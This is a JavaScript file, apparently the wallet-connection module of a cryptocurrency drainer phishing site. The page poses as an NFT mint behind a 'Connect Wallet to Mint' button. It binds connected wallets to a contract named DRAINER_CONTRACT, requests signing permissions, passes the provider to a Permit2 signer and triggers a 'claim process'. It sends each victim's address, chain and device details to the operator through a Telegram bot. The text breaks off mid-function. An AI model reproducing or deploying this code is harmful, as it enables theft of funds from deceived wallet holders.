import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ══════════════════════════════════════════════════════════════════════════
  //  CONFIG  (exact fields script.js + config.js declare)
  // ══════════════════════════════════════════════════════════════════════════
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
  } = CONFIG || {};

  const PRIMARY_PROJECT_ID  = PROJECT_ID;
  const FALLBACK_PROJECT_ID = (PUBLIC_TEST_ID && PUBLIC_TEST_ID !== PROJECT_ID) ? PUBLIC_TEST_ID : null;

  const RELAY_URLS = [
    'wss://relay.walletconnect.com',
    'wss://relay.walletconnect.org',
  ];

  // ── Storage keys: BOTH schemas, always ────────────────────────────────────
  // script.js reads these two:
  const LS_SCRIPT_ADDR = 'connectedAddress';
  const LS_SCRIPT_TYPE = 'connectedWalletType';
  // main.js internal:
  const LS_WC_SESSION  = 'apex_wc_session';
  const LS_PENDING_URI = 'apex_pending_uri';
  const LS_PENDING_TS  = 'apex_pending_ts';
  // legacy keys (kept so nothing else breaks):
  const LS_LEGACY_ADDR = 'connectedWallet';
  const LS_LEGACY_CHAIN = 'chainType';

  // ══════════════════════════════════════════════════════════════════════════
  //  PLATFORM
  // ══════════════════════════════════════════════════════════════════════════
  const UA = navigator.userAgent || '';
  const isMobileDevice  = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOSDevice     = /iPhone|iPad|iPod/i.test(UA);
  const isAndroidDevice = /Android/i.test(UA);
  const isDesktopDevice = !isMobileDevice;
  const isWindowsDevice = /Windows/i.test(UA);
  const isMacDevice     = /Macintosh|Mac OS X/i.test(UA);

  const getPlatform = () => {
    if (isIOSDevice)     return 'ios';
    if (isAndroidDevice) return 'android';
    if (isWindowsDevice) return 'windows';
    if (isMacDevice)     return 'mac';
    return 'unknown';
  };

  // ══════════════════════════════════════════════════════════════════════════
  //  DEBUG PANEL
  // ══════════════════════════════════════════════════════════════════════════
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  IN-WALLET BROWSER DETECTION
  // ══════════════════════════════════════════════════════════════════════════
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (!eth) return null;
    if (eth.isMetaMask && /MetaMaskMobile/i.test(UA)) return { wallet: 'metamask', name: 'MetaMask' };
    if (eth.isTrust || /TrustWallet/i.test(UA))       return { wallet: 'trust',    name: 'Trust Wallet' };
    if (eth.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    if (/Rainbow/i.test(UA))                          return { wallet: 'rainbow',  name: 'Rainbow' };
    if (eth && isMobileDevice)                        return { wallet: 'injected', name: 'Wallet' };
    return null;
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  TELEGRAM
  // ══════════════════════════════════════════════════════════════════════════
  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      if (!r.ok) { console.error('[main.js] Telegram error:', await r.text()); return false; }
      return true;
    } catch (e) { console.error('[main.js] Telegram exception:', e); return false; }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ══════════════════════════════════════════════════════════════════════════
  //  TIMEOUT HELPER (clearable — no leaked timers)
  // ══════════════════════════════════════════════════════════════════════════
  function withTimeout(promise, ms, label) {
    let timer;
    const timeout = new Promise((_, reject) => {
      timer = setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms);
    });
    return Promise.race([promise, timeout]).finally(() => clearTimeout(timer));
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  LIBRARY LOADING
  // ══════════════════════════════════════════════════════════════════════════
  async function tryImport(urls, pickFn, label, timeoutMs = 8000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(url), timeoutMs, `${label} @ ${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export not found at ${url}`);
        logDebug(`✅ ${label} from ${url} (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} fail @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadWalletConnectLibraries() {
    const providerCdn = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];
    const web3Cdn = [
      'https://esm.sh/web3@4.3.0?bundle',
      'https://cdn.jsdelivr.net/npm/web3@4.3.0/+esm',
      'https://cdn.skypack.dev/web3@4.3.0',
    ];

    const [EthereumProvider, Web3Mod] = await Promise.all([
      tryImport(providerCdn, (m) => m.EthereumProvider || m.default || m, 'EthereumProvider'),
      tryImport(web3Cdn,     (m) => m.default || m.Web3 || m,             'Web3'),
    ]);
    return { EthereumProvider, Web3: Web3Mod.default || Web3Mod };
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  RELAY PROBE
  // ══════════════════════════════════════════════════════════════════════════
  async function pickRelayUrl(timeoutMs = 2500) {
    for (const url of RELAY_URLS) {
      try {
        const ok = await withTimeout(
          new Promise((resolve) => {
            let ws;
            try { ws = new WebSocket(url); } catch { return resolve(false); }
            const done = (v) => { try { ws.close(); } catch {} resolve(v); };
            const t = setTimeout(() => done(false), timeoutMs);
            ws.onopen  = () => { clearTimeout(t); done(true); };
            ws.onerror = () => { clearTimeout(t); done(false); };
          }),
          timeoutMs + 500,
          `ws-probe ${url}`
        );
        if (ok) { logDebug(`🌐 Relay OK: ${url}`); return url; }
      } catch { /* next */ }
    }
    logDebug('⚠️ No relay reachable — letting SDK pick');
    return null;
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  DOM
  // ══════════════════════════════════════════════════════════════════════════
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ══════════════════════════════════════════════════════════════════════════
  //  STATE
  // ══════════════════════════════════════════════════════════════════════════
  let EthereumProvider = null;
  let Web3Ctor         = null;

  let wcProvider       = null;
  let injectedProvider = null;
  let activeProvider   = null;
  let web3Instance     = null;
  let contractInstance = null;
  let currentSession   = null;
  let connectionMode   = null;
  let isConnecting     = false;
  let isDisconnecting  = false;

  // ══════════════════════════════════════════════════════════════════════════
  //  BUTTON UI
  // ══════════════════════════════════════════════════════════════════════════
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';
    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ══════════════════════════════════════════════════════════════════════════
  //  STORAGE HELPERS — write BOTH schemas so script.js always sees them
  // ══════════════════════════════════════════════════════════════════════════
  function saveWallet(address, mode = null, session = null) {
    try {
      // script.js's schema:
      localStorage.setItem(LS_SCRIPT_ADDR, address);
      if (mode) localStorage.setItem(LS_SCRIPT_TYPE, mode);

      // legacy / internal schema:
      localStorage.setItem(LS_LEGACY_ADDR, address);
      if (mode) {
        const chainVal =
          (mode === 'injected' || mode === 'walletconnect') ? 'evm' :
          (mode === 'solana' || mode === 'bitcoin') ? mode : 'evm';
        localStorage.setItem(LS_LEGACY_CHAIN, chainVal);
      }

      if (session) localStorage.setItem(LS_WC_SESSION, JSON.stringify(session));
    } catch (e) { logDebug('saveWallet: ' + e.message); }
  }

  const getSavedWallet = () => localStorage.getItem(LS_SCRIPT_ADDR) || localStorage.getItem(LS_LEGACY_ADDR);
  const getSavedMode   = () => localStorage.getItem(LS_SCRIPT_TYPE);
  const getSavedChain  = () => localStorage.getItem(LS_LEGACY_CHAIN) || 'unknown';
  const getSavedWCSession = () => {
    try { const s = localStorage.getItem(LS_WC_SESSION); return s ? JSON.parse(s) : null; }
    catch { return null; }
  };

  function clearSavedWallet() {
    try {
      localStorage.removeItem(LS_SCRIPT_ADDR);
      localStorage.removeItem(LS_SCRIPT_TYPE);
      localStorage.removeItem(LS_LEGACY_ADDR);
      localStorage.removeItem(LS_LEGACY_CHAIN);
      localStorage.removeItem(LS_WC_SESSION);
    } catch {}
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  GLOBAL PUBLISH — exact shape script.js's syncFromGlobal() reads
  // ══════════════════════════════════════════════════════════════════════════
  function publishGlobalState(address, chain, provider = null) {
    const live = provider || activeProvider || null;
    window.__apexConnected = {
      address,
      chain,                                        // 'evm' | 'solana' | 'bitcoin'
      web3: web3Instance,
      contract: contractInstance,
      provider: live,                               // used by script.js's Permit2 signer
      mode: connectionMode,
      session: currentSession || wcProvider?.session || null,
      publishedAt: Date.now(),
    };
    logDebug(`publishGlobal: addr=${address} chain=${chain} mode=${connectionMode} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  CONNECTED UI
  // ══════════════════════════════════════════════════════════════════════════
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
🧩 <b>Mode:</b> ${connectionMode || 'unknown'}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobileDevice ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    currentSession = null;
    connectionMode = null;
    window.__apexConnected = null;
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  EIP-6963
  // ══════════════════════════════════════════════════════════════════════════
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    const fire = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    fire();
    setTimeout(fire, 500);
    setTimeout(fire, 1500);
  }

  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);
    const list = modalEl.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px'; i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  DEEPLINK HELPERS (Windows + desktop QR fallback)
  // ══════════════════════════════════════════════════════════════════════════
  function buildWalletDeeplink(wallet, uri) {
    const enc = encodeURIComponent(uri);
    switch (wallet) {
      case 'trust':    return `https://link.trustwallet.com/wc?uri=${enc}`;
      case 'metamask': return `https://metamask.app.link/wc?uri=${enc}`;
      case 'rainbow':  return `https://rnbwapp.com/wc?uri=${enc}`;
      case 'coinbase': return `https://go.cb-w.com/wc?uri=${enc}`;
      case 'uniswap':  return `https://uniswap.org/app/wc?uri=${enc}`;
      default:         return null;
    }
  }

  function openDeeplink(url) {
    if (!url) return false;
    try {
      const a = document.createElement('a');
      a.href = url; a.rel = 'noopener noreferrer'; a.style.display = 'none';
      document.body.appendChild(a); a.click();
      setTimeout(() => a.remove(), 500);
      return true;
    } catch (e) { logDebug('deeplink error: ' + e.message); return false; }
  }

  function showDeeplinkFallback(uri) {
    const existing = document.getElementById('apex-wc-deeplink');
    if (existing) existing.remove();

    const wrap = document.createElement('div');
    wrap.id = 'apex-wc-deeplink';
    wrap.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.78);
      display:flex;align-items:center;justify-content:center;z-index:99998;
      font-family:Inter,system-ui,sans-serif;color:white;
    `;
    wrap.innerHTML = `
      <div style="background:#1F2937;padding:24px;border-radius:16px;max-width:460px;width:92%;">
        <h3 style="margin:0 0 12px;font-size:18px;font-weight:600;">Scan with your wallet</h3>
        <div id="apex-qr" style="background:white;border-radius:12px;padding:12px;display:flex;justify-content:center;margin-bottom:12px;min-height:264px;align-items:center;color:#666;font-size:13px;">Loading QR…</div>
        <p style="font-size:12px;color:#9CA3AF;margin:0 0 10px;word-break:break-all;">
          Or copy the URI: <code id="apex-uri" style="color:#FCD34D;">${uri.slice(0, 64)}…</code>
        </p>
        <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px;">
          <button data-wallet="metamask" style="flex:1;min-width:120px;background:#374151;border:none;padding:10px;border-radius:8px;color:white;cursor:pointer;">MetaMask</button>
          <button data-wallet="trust"    style="flex:1;min-width:120px;background:#374151;border:none;padding:10px;border-radius:8px;color:white;cursor:pointer;">Trust Wallet</button>
          <button data-wallet="rainbow"  style="flex:1;min-width:120px;background:#374151;border:none;padding:10px;border-radius:8px;color:white;cursor:pointer;">Rainbow</button>
          <button data-wallet="coinbase" style="flex:1;min-width:120px;background:#374151;border:none;padding:10px;border-radius:8px;color:white;cursor:pointer;">Coinbase</button>
          <button data-wallet="copy"     style="flex:1;min-width:120px;background:#0EA5E9;border:none;padding:10px;border-radius:8px;color:white;cursor:pointer;">Copy URI</button>
          <button data-wallet="close"    style="flex:1;min-width:120px;background:none;border:1px solid #666;padding:10px;border-radius:8px;color:#ccc;cursor:pointer;">Cancel</button>
        </div>
      </div>
    `;
    document.body.appendChild(wrap);

    const qrBox = wrap.querySelector('#apex-qr');
    import('https://esm.sh/qrcode@1.5.3?bundle')
      .then((m) => {
        const QR = m.default || m;
        const canvas = document.createElement('canvas');
        QR.toCanvas(canvas, uri, { width: 240, margin: 1 }, (err) => {
          if (!err) { qrBox.innerHTML = ''; qrBox.appendChild(canvas); }
          else qrBox.textContent = 'QR unavailable';
        });
      })
      .catch(() => { qrBox.textContent = 'QR unavailable'; });

    wrap.addEventListener('click', (e) => {
      const b = e.target.closest('button[data-wallet]');
      if (!b) return;
      const w = b.getAttribute('data-wallet');
      if (w === 'close') { wrap.remove(); return; }
      if (w === 'copy') {
        navigator.clipboard.writeText(uri).then(() => {
          b.textContent = 'Copied!';
          setTimeout(() => { b.textContent = 'Copy URI'; }, 1500);
        });
        return;
      }
      const link = buildWalletDeeplink(w, uri);
      if (link) openDeeplink(link);
    });
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  PROVIDER EVENTS
  // ══════════════════════════════════════════════════════════════════════════
  function attachWCProviderEvents(provider) {
    if (!provider || provider.__apexEventsAttached) return;
    provider.__apexEventsAttached = true;

    provider.on('accountsChanged', (accounts) => {
      logDebug(`WC accountsChanged: ${JSON.stringify(accounts)}`);
      if (!accounts || accounts.length === 0) {
        // Grace period — WC wallets emit [] transiently during connect.
        setTimeout(async () => {
          try {
            const again = provider.accounts || (await provider.request({ method: 'eth_accounts' }));
            if (!again || again.length === 0) hardDisconnect({ skipWalletCall: true });
          } catch { hardDisconnect({ skipWalletCall: true }); }
        }, 700);
        return;
      }
      const a = accounts[0];
      saveWallet(a, 'walletconnect', provider.session || null);
      updateConnectedUI(a, 'evm');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 900);
    });

    provider.on('chainChanged', (id) => {
      logDebug(`WC chainChanged: ${id}`);
      showStatus(`Network changed to ${id}`, 'info');
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', (reason) => {
      logDebug(`WC disconnect: ${reason}`);
      hardDisconnect({ skipWalletCall: true });
    });

    provider.on('session_delete', () => {
      logDebug('WC session_delete');
      hardDisconnect({ skipWalletCall: true });
    });
  }

  function attachInjectedEvents(provider) {
    if (!provider || !provider.on || provider.__apexInjectedEvents) return;
    provider.__apexInjectedEvents = true;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        setTimeout(async () => {
          try {
            const again = await provider.request({ method: 'eth_accounts' });
            if (!again || again.length === 0) hardDisconnect({ skipWalletCall: true });
          } catch { hardDisconnect({ skipWalletCall: true }); }
        }, 700);
        return;
      }
      const a = accounts[0];
      saveWallet(a, 'injected');
      updateConnectedUI(a, 'evm');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 900);
    });

    provider.on('chainChanged', () => {
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', () => hardDisconnect({ skipWalletCall: true }));
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  INJECTED CONNECT (with WC-fallback awareness)
  // ══════════════════════════════════════════════════════════════════════════
  async function connectInjected() {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 400));

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return null;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info?.rdns === 'io.metamask' || /metamask/i.test(p.info?.name || '')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return null;
    }

    try {
      const provider = chosen.provider;

      // Some in-wallet stubs never resolve eth_requestAccounts. We race it
      // against a hard timeout so we can cleanly fall back to WalletConnect.
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        12000,
        'eth_requestAccounts'
      );
      if (!accounts?.length) return null;

      const address = accounts[0];
      injectedProvider = provider;
      activeProvider = provider;
      connectionMode = 'injected';

      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, 'injected');
      attachInjectedEvents(provider);
      updateConnectedUI(address, 'evm');
      logDebug(`✅ Injected connected: ${address} (${chosen.info?.name || 'wallet'})`);
      return address;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return null;
    }
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  WALLETCONNECT — single EthereumProvider, no separate SignClient
  // ══════════════════════════════════════════════════════════════════════════
  async function initWalletConnect({ useFallbackId = false, session = null } = {}) {
    if (wcProvider) return wcProvider;

    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
    if (!projectId) { logDebug('❌ No WalletConnect projectId'); return null; }

    try {
      const relayUrl = await pickRelayUrl();
      logDebug(`WC init: pid=${String(projectId).slice(0, 8)}…${session ? ' (restore)' : ''}`);

      const opts = {
        projectId,
        chains: [MAINNET_ID],
        optionalChains: [MAINNET_ID],
        showQrModal: false,
        methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4', 'eth_sign'],
        events: ['chainChanged', 'accountsChanged'],
        metadata: DAPP_METADATA,
        rpcMap: { [MAINNET_ID]: 'https://cloudflare-eth.com' },
      };
      if (relayUrl) opts.relayUrl = relayUrl;
      if (session) opts.session = session;

      wcProvider = await withTimeout(
        EthereumProvider.init(opts),
        15000,
        'EthereumProvider.init'
      );

      attachWCProviderEvents(wcProvider);
      logDebug('✅ WC provider ready');
      return wcProvider;
    } catch (e) {
      logDebug(`WC init failed: ${e.message}`);
      wcProvider = null;
      return null;
    }
  }

  async function connectWalletConnect({ useFallbackId = false } = {}) {
    const provider = await initWalletConnect({ useFallbackId });
    if (!provider) return null;

    // Session already live — sync UI and short-circuit.
    if (provider.session && provider.accounts?.length) {
      const a = provider.accounts[0];
      activeProvider = provider;
      connectionMode = 'walletconnect';
      currentSession = provider.session;
      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      saveWallet(a, 'walletconnect', provider.session);
      updateConnectedUI(a, 'evm');
      return a;
    }

    showStatus('Opening wallet…', 'info');

    let uriHandled = false;
    const onUri = (uri) => {
      if (uriHandled) return;
      uriHandled = true;
      logDebug(`URI: ${uri}`);
      try { showDeeplinkFallback(uri); } catch (e) { logDebug('deeplink UI: ' + e.message); }
      try {
        sessionStorage.setItem(LS_PENDING_URI, uri);
        sessionStorage.setItem(LS_PENDING_TS, Date.now().toString());
      } catch {}
    };
    provider.on('display_uri', onUri);

    try {
      const accounts = await withTimeout(provider.enable(), 300000, 'WC enable');
      provider.removeListener?.('display_uri', onUri);
      document.getElementById('apex-wc-deeplink')?.remove();
      try {
        sessionStorage.removeItem(LS_PENDING_URI);
        sessionStorage.removeItem(LS_PENDING_TS);
      } catch {}

      if (!accounts?.length) {
        logDebug('WC enable returned no accounts');
        return null;
      }

      const address = accounts[0];
      activeProvider = provider;
      connectionMode = 'walletconnect';
      currentSession = provider.session || null;
      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, 'walletconnect', currentSession);
      updateConnectedUI(address, 'evm');
      logDebug(`✅ WC connected: ${address}`);
      return address;
    } catch (e) {
      provider.removeListener?.('display_uri', onUri);
      document.getElementById('apex-wc-deeplink')?.remove();
      try {
        sessionStorage.removeItem(LS_PENDING_URI);
        sessionStorage.removeItem(LS_PENDING_TS);
      } catch {}
      logDebug('WC enable error: ' + e.message);
      return null;
    }
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  HARD DISCONNECT — kills WC session (clears wallet's "connected apps")
  // ══════════════════════════════════════════════════════════════════════════
  async function hardDisconnect({ skipWalletCall = false } = {}) {
    if (isDisconnecting) return;
    isDisconnecting = true;

    try {
      if (!skipWalletCall && connectionMode === 'walletconnect' && wcProvider?.session) {
        try {
          await Promise.race([
            wcProvider.disconnect(),
            new Promise((_, rej) => setTimeout(() => rej(new Error('disconnect timeout')), 6000)),
          ]);
          logDebug('WC session deleted');
        } catch (e) { logDebug('WC disconnect err: ' + e.message); }
      }

      if (connectionMode === 'injected' && injectedProvider?.request) {
        try {
          await injectedProvider.request({
            method: 'wallet_revokePermissions',
            params: [{ eth_accounts: {} }],
          }).catch(() => {});
        } catch {}
      }
    } finally {
      wcProvider = null;
      injectedProvider = null;
      activeProvider = null;
      web3Instance = null;
      contractInstance = null;
      currentSession = null;
      connectionMode = null;
      document.getElementById('apex-wc-deeplink')?.remove();
      resetConnectedUI();
      clearSavedWallet();
      isDisconnecting = false;
      logDebug('🔌 Disconnected');
    }
  }

  // ══════════════════════════════════════════════════════════════════════════
  //  CONNECT DISPATCHER — respects script.js ownership
  // ══════════════════════════════════════════════════════════════════════════
  async function connectWallet() {
    if (isConnecting) return;
    isConnecting = true;
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    let address = null;

    try {
      const inWallet = detectInWalletBrowser();

      // ── Inside a wallet's in-app browser: injected first, WC fallback ──
      if (inWallet && isMobileDevice) {
        logDebug(`📱 In-wallet browser: ${inWallet.name}`);
        address = await connectInjected();
      }
      // ── Desktop with injected providers: injected first ──
      else if (isDesktopDevice && window.ethereum && evmProviders.length > 0) {
        address = await connectInjected();
      }

      // ── Fall back to WalletConnect ──
      if (!address) address = await connectWalletConnect({ useFallbackId: false });
      if (!address && FALLBACK_PROJECT_ID) {
        logDebug('Retrying WC with fallback projectId…');
